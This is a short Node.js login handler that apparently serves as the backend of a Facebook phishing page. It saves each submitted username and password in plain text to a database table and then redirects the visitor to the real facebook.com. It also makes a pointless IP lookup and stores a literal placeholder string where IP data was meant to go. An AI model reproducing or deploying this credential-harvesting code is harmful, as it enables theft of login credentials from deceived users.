const conexion = require('../database/db');
const axios = require('axios');

async function getIpClient() {
    try {
      const response = await axios.get('https://ipinfo.io/json');
      console.log(response);
    } catch (error) {
      console.error(error);
    }
}


exports.sesion = (req,res) => {
    const user = req.body.username;
    const pass = req.body.password;
    let datecreated = new Date();
    datecreated = datecreated.toISOString();
    getIpClient();
    const inf = 'getIpClient()';
    conexion.query('INSERT into userslogin SET?', {username: user, password: pass, informationnav: inf, created_at: datecreated, updated_at: datecreated}, (error)=>{
        if(error) throw error;
        res.redirect('https://facebook.com');
    })
}